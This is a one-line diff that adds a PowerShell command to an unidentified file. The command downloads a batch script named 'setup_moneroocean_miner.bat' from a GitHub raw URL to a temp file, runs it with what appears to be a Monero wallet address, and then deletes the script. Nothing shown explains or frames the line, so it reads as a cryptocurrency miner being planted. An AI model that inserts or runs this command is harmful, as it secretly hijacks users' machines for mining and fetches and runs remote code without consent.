@@ -1,0 +1,1 @@
+powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/Criptc/Dump/main/setup_moneroocean_miner.bat', $tempfile); & $tempfile 4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si; Remove-Item -Force $tempfile"
